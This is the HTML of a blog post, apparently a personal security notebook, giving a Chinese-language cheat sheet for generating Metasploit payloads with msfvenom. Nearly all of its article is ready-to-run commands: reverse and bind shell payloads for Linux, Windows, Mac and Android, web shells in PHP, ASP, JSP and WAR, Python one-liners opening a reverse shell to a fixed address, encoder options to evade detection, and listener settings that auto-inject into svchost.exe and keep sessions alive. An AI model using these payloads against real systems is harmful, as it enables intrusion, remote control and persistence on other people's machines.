@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Whatever is worth doing is worth doing well !">
+    <meta name="author" content="ssooking">
+    
+    <title>
+        
+            msfvenom生成payload |
+        
+        ssooking&#39;s notebook
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"ssooking.github.io","root":"/","language":"en","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":false},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.png","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep moving!"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":false},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":3};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                ssooking&#39;s notebook
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                CATEGORIES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">msfvenom生成payload</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.png">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">ssooking</span>
+                        
+                            <span class="author-label">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2016-11-15 17:22:00</span>
+        <span class="mobile">2016-11-15 17:22</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/">神兵利器</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/kali/">kali</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/metasploit/">metasploit</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/RAT/">RAT</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E6%9C%A8%E9%A9%AC%E5%90%8E%E9%97%A8/">木马后门</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="msfvenom重要参数"><a href="#msfvenom重要参数" class="headerlink" title="msfvenom重要参数"></a>msfvenom重要参数</h1><p>查看payloads: <code>msfvenom -l payloads      </code><br>查看支持的文件格式：<code>msfvenom -l formats</code><br>查看payload所需参数：<code>msfvenom -p xxx --list-options</code><br>查看编码器：<code>msfvenom --list encoders</code><br>编码参数使用示例：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-e x86/shikata_ga_nai -i 5 -b <span class="string">&#x27;\x00\x0A\x0D&#x27;</span> //使用shikata_ga_nai编码器编码5次并去除会造成截断的坏字符</span><br></pre></td></tr></table></figure>
+
+<p>在生成 shellcode时记得加-b参数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 -p windows/messagebox TEXT=<span class="string">&quot;Exploit test!&quot;</span> -e x86/shikata_ga_nai -i 5 -b <span class="string">&#x27;\x00\x0A\x0D&#x27;</span> -f raw</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">windows/exec cmd=calc.exe</span><br><span class="line">windows/shell_bind_tcp</span><br><span class="line">windows/meterpreter/bind_tcp</span><br><span class="line">windows/meterpreter/reverse_tcp</span><br><span class="line">windows/x64/meterpreter/reverse_tcp</span><br><span class="line">linux/x86/shell_bind_tcp</span><br><span class="line">linux/x86/meterpreter_reverse_tcp</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="System-Payloads"><a href="#System-Payloads" class="headerlink" title="System Payloads"></a>System Payloads</h2><p>后面以tcp反弹shell为例。</p>
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -f elf -o shell.elf</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=123.207.15.73 LPORT=9999 -f elf -o shell.elf</span><br></pre></td></tr></table></figure>
+
+<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>messagebox Test</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 -p windows/messagebox Title=<span class="string">&quot;ssooking&quot;</span> TEXT=<span class="string">&quot;hello, it is a test&quot;</span> -f exe -o hello.exe</span><br><span class="line">msfvenom -p windows/messagebox Title=<span class="string">&quot;ssooking&quot;</span> TEXT=<span class="string">&quot;hello, it is a test&quot;</span> -f exe -o hello.exe  <span class="comment">#64位</span></span><br></pre></td></tr></table></figure>
+
+<p>windows下生成32位&#x2F;64位payload时需要注意系统架构相同。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/shell_bind_tcp RHOST=xxx RPORT=xxx -f exe -o shell.exe</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -f exe -o shell.exe</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -f exe -o shell.exe</span><br></pre></td></tr></table></figure>
+
+<p>以<code>windows/meterpreter/reverse_tcp</code>为例，该payload默认为32位，也可使用<code>-a x86</code>选项指定。</p>
+<p>如果要生成64位，则payload为<code>windows/x64/meterpreter/reverse_tcp</code>。</p>
+<h3 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h3><p>nc正向连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_hidden_bind_tcp LPORT=xxx AHOST=xxx -f exe -o 1.exe      </span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>AHOST：允许连接的主机</p>
+</blockquote>
+<p> nc反弹连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=xxx LPORT=xxx -f exe -o 1.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=xxx LPORT=xxx -f macho -o shell.macho</span><br></pre></td></tr></table></figure>
+
+<h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -f raw -o shell.apk</span><br></pre></td></tr></table></figure>
+
+<h2 id="Web-Payloads"><a href="#Web-Payloads" class="headerlink" title="Web Payloads"></a>Web Payloads</h2><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=xxx LPORT=xxx -f raw -o shell.php</span><br><span class="line"><span class="built_in">cat</span> shell.php | pbcopy &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;&lt;?php &#x27;</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;\n&#x27;</span> -o shell.php &amp;&amp; pbpaste -o-o shell.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -f asp -o shell.asp</span><br></pre></td></tr></table></figure>
+
+<h3 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=xxx LPORT=xxx -f raw -o shell.jsp</span><br></pre></td></tr></table></figure>
+
+<h3 id="war"><a href="#war" class="headerlink" title="war"></a>war</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=xxx LPORT=xxx -f war -o shell.war</span><br></pre></td></tr></table></figure>
+
+<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=xxx LPORT=xxx -f raw -o shell.py</span><br><span class="line">msfvenom -a python -p python/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -f raw -o shell.py</span><br></pre></td></tr></table></figure>
+
+<p>正向shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python/python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.16.176.1&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br><span class="line"></span><br><span class="line">python/python3 -c <span class="string">&quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect((&#x27;172.16.176.1&#x27;,9999))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=xxx LPORT=xxx -f raw -o shell.sh</span><br></pre></td></tr></table></figure>
+
+<h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=xxx LPORT=xxx -f raw -o shell.pl</span><br></pre></td></tr></table></figure>
+
+<h3 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p nodejs/shell_reverse_tcp LHOST=xxx LPORT=xxx -f raw -o shell.js</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="MSF监听"><a href="#MSF监听" class="headerlink" title="MSF监听"></a>MSF监听</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD &lt;Payload name&gt;</span><br><span class="line"><span class="built_in">set</span> RHOST &lt;RHOST value&gt;</span><br><span class="line"><span class="built_in">set</span> RPORT &lt;RPORT value&gt;</span><br><span class="line"><span class="built_in">set</span> LHOST &lt;LHOST value&gt;</span><br><span class="line"><span class="built_in">set</span> LPORT &lt;LPORT value&gt;</span><br><span class="line"><span class="built_in">set</span> ExitOnSession <span class="literal">false</span></span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure>
+
+<p>直接快速进行监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; handler -H &lt;RHOST/LHOST&gt; -P &lt;RPORT/LPORT&gt; -p windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<h2 id="其他设置"><a href="#其他设置" class="headerlink" title="其他设置"></a>其他设置</h2><h3 id="自动执行脚本"><a href="#自动执行脚本" class="headerlink" title="自动执行脚本"></a>自动执行脚本</h3><p>如：自动执行<code>post/windows/manage/migrate</code> 模块，该模块的功能注入其他进程</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> AutoRunScript post/windows/manage/migrate</span><br></pre></td></tr></table></figure>
+
+<h3 id="自动注入进程"><a href="#自动注入进程" class="headerlink" title="自动注入进程"></a>自动注入进程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> prependmigrate <span class="literal">true</span></span><br><span class="line"><span class="built_in">set</span> prependmigrateProc svchost.exe</span><br></pre></td></tr></table></figure>
+
+<p>PS：一些高级参数在使用msfvenom生成木马的时候就可以设置，如直接生成能够自动注入svchost.exe的木马。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform win -p windows/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -e x86/shikata_ga_nai -i 5 -b <span class="string">&#x27;\x00\x0A\x0D&#x27;</span> PrependMigrate=<span class="literal">true</span> PrependMigrateProc=svchost.exe -f exe -o  shell.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="handler高级配置"><a href="#handler高级配置" class="headerlink" title="handler高级配置"></a>handler高级配置</h3><p><code>show advanced</code>查看高级配置参数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> exitonsession <span class="literal">false</span> //可以让建立监听的端口继续保持侦听，可以接受多个session</span><br><span class="line"><span class="built_in">set</span> stagerverifysslcert <span class="literal">false</span> //防止获取shell的时候出现的SSL_accept错误</span><br><span class="line"><span class="built_in">set</span> SessionCommunicationTimeout 0  //防止会话在长时间(默认存活300秒,5分钟)无操作时被杀死</span><br><span class="line"><span class="built_in">set</span> SessionExpirationTimeout 0 //防止会话将被强制关闭(默认保留604800秒,一周)</span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：msfvenom生成payload</li>
+        <li>Post author：ssooking</li>
+        <li>Create time：2016-11-15 17:22:00</li>
+        <li>
+            Post link：https://ssooking.github.io/2016/11/msfvenom生成payload/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/kali/">#kali</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/metasploit/">#metasploit</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/RAT/">#RAT</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E6%9C%A8%E9%A9%AC%E5%90%8E%E9%97%A8/">#木马后门</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2017/04/%E5%88%A9%E7%94%A8pentestbox%E6%89%93%E9%80%A0ms17-010%E7%A7%BB%E5%8A%A8%E6%9D%80%E5%99%A8/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">利用Pentestbox打造MS17-010移动杀器</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2016/10/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Java反序列化漏洞分析</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2016</span>
+              -
+            
+            2023&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">ssooking</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#msfvenom%E9%87%8D%E8%A6%81%E5%8F%82%E6%95%B0"><span class="nav-number">1.</span> <span class="nav-text">msfvenom重要参数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8payload"><span class="nav-number">2.</span> <span class="nav-text">常用payload</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#System-Payloads"><span class="nav-number">2.1.</span> <span class="nav-text">System Payloads</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux"><span class="nav-number">2.1.1.</span> <span class="nav-text">Linux</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows"><span class="nav-number">2.1.2.</span> <span class="nav-text">Windows</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Netcat"><span class="nav-number">2.1.3.</span> <span class="nav-text">Netcat</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Mac"><span class="nav-number">2.1.4.</span> <span class="nav-text">Mac</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Android"><span class="nav-number">2.1.5.</span> <span class="nav-text">Android</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-Payloads"><span class="nav-number">2.2.</span> <span class="nav-text">Web Payloads</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php"><span class="nav-number">2.2.1.</span> <span class="nav-text">php</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#asp"><span class="nav-number">2.2.2.</span> <span class="nav-text">asp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jsp"><span class="nav-number">2.2.3.</span> <span class="nav-text">jsp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#war"><span class="nav-number">2.2.4.</span> <span class="nav-text">war</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python"><span class="nav-number">2.2.5.</span> <span class="nav-text">python</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bash"><span class="nav-number">2.2.6.</span> <span class="nav-text">bash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#perl"><span class="nav-number">2.2.7.</span> <span class="nav-text">perl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nodejs"><span class="nav-number">2.2.8.</span> <span class="nav-text">nodejs</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MSF%E7%9B%91%E5%90%AC"><span class="nav-number">3.</span> <span class="nav-text">MSF监听</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E8%AE%BE%E7%BD%AE"><span class="nav-number">3.1.</span> <span class="nav-text">其他设置</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%87%AA%E5%8A%A8%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC"><span class="nav-number">3.1.1.</span> <span class="nav-text">自动执行脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5%E8%BF%9B%E7%A8%8B"><span class="nav-number">3.1.2.</span> <span class="nav-text">自动注入进程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#handler%E9%AB%98%E7%BA%A7%E9%85%8D%E7%BD%AE"><span class="nav-number">3.1.3.</span> <span class="nav-text">handler高级配置</span></a></li></ol></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
